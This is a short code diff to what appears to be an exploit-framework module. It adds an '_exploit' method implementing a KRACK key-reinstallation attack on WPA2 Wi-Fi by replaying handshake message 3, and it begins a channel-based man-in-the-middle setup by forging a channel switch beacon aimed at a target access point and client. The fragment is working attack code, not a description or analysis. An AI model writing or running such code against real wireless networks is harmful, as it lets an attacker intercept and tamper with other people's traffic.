@@ -168,6 +168,14 @@ class Exploit(Exploit):
             print_error("Invalid MAC address format")
             return
 
+        print_success("MAC validation passed; launching exploit ...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: KRACK PTK reinstallation via M3 replay with channel-based MitM."""
+        ap_mac = _parse_mac(self.bssid)
+        client_mac = _parse_mac(self.target)
+
         print_status("Phase 1: Channel-based MitM setup")
         csa_frame = _build_csa_beacon(
             ap_mac, self.ssid or "target",
